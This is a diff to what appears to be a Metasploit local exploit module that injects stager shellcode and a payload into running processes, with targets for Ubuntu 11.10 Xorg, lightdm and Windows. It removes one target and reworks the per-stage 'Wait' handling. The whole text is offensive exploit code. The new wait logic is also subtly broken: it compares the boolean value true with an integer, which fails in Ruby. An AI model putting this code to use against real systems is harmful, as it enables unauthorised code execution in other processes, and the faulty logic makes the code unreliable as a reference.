@@ -13,7 +13,6 @@ class Metasploit3 < Msf::Exploit::Local
             'Signature' => "\xff\xe0",
             'Offset' => 0,
             'Payload' => true,
-            'Wait' => true,
         }
 
         linuxStage2 = { 'Patch' =>
@@ -21,7 +20,6 @@ class Metasploit3 < Msf::Exploit::Local
             'Signature' => "\xff\xe0\x00\x00\x00\x00\x00\x00",
             'Offset' => 0,
             'Payload' => true,
-            'Wait' => true,
         }
         debugStage2 = { 'Patch' =>
                 "",
@@ -61,19 +59,8 @@ class Metasploit3 < Msf::Exploit::Local
                             'Space' => 2048,
                             'Payload' => false,
                             'Patch' => winStager,
+                            'Wait' => true,
                             }, winStage2 ] }
-                    ],
-					[ 'ubuntu 11.10 libpixmap', 
-                        { 
-                        'Arch' => ARCH_X86,
-                        'Platform' => 'linux',
-                        'Stages' => [ { 
-                            'Offset' => 0x480, 
-                            'Signature' =>"\x55\x57\x56\x53\x83\xEC\x5C\x8B",
-                            'Patch' => linuxStager,
-                            'Space' => 2048,
-                            'Payload'=> false,
-                            }, linuxStage2 ] }
                     ],
 					[ 'ubuntu 11.10 Xorg', 
                         { 
@@ -85,6 +72,7 @@ class Metasploit3 < Msf::Exploit::Local
                             'Patch' => linuxStager,
                             'Space' => 2048,
                             'Payload'=> false,
+                            'Wait' => 3,
                             }, linuxStage2 ] }
                     ],
 					[ 'ubuntu 11.10 lightdm', 
@@ -97,6 +85,7 @@ class Metasploit3 < Msf::Exploit::Local
                             'Patch' => linuxStager,
                             'Space' => 2048,
                             'Payload'=> false,
+                            'Wait' => true,
                             }, linuxStage2 ] }
                     ],
 					[ 'Ubuntu 11.10 direct', 
@@ -152,10 +141,6 @@ class Metasploit3 < Msf::Exploit::Local
         ##
         oldmem = false
         for stage in target['Stages']
-            if (stage['Wait'])
-                puts 'Press enter if the current stage is run'
-                gets
-            end
 
             # Write memory of previous stage
             d.write(oldmem[0],oldmem[1]) if oldmem
@@ -164,6 +149,16 @@ class Metasploit3 < Msf::Exploit::Local
             patch = stage['Patch']
             patch += payload.encoded if stage['Payload']
             oldmem = patchPage(d, stage['Signature'],patch,stage['Offset'])
+            if stage['Wait']
+                if stage['Wait'] == true
+                    puts 'Press enter if the current stage is run'
+                    gets
+                end
+                if stage['Wait'] >= 1
+                    puts "sleeping for " + stage['Wait'].to_s  + " seconds"
+                    sleep(stage['Wait'])
+                end
+            end
         end
 
         ##
